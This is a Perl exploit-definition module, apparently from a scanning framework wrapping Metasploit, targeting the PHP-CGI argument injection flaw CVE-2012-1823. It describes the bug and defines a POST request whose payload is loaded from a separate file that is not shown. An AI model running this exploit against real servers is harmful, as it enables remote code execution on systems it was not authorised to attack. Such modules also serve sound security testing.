package PHP::MSF::PhpCgiArgInjection;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "PhpCgiArgInjection";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2012-1823",
  DESCRIPTION => "

        When run as a CGI, PHP up to version 5.3.12 and 5.4.2 is vulnerable to

        an argument injection vulnerability.  This module takes advantage of

        the -d flag to set php.ini directives to achieve code execution.

        From the advisory: \"if there is NO unescaped '=' in the query string,

        the string is split on '+' (encoded space) characters, urldecoded,

        passed to a function that escapes shell metacharacters (the \"encoded in

        a system-defined manner\" from the RFC) and then passes them to the CGI

        binary.\" This module can also be used to exploit the plesk 0day disclosed

        by kingcope and exploited in the wild on June 2013.

      ",
  MSF_MODULE => "php_cgi_arg_injection",
  OSVDB => 93979,
  REFERENCES => [
    "http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/",
    "http://kb.parallels.com/en/116241",
  ],
  TITLE => "PHP CGI Argument Injection",


  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => '',
      PAYLOAD      => read_file('MSFExploits/PHP/MSF/src/PhpCgiArgInjection.payload', 1),
      TEXT   => 'Sending Exploit #1 Request : [POST] /',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
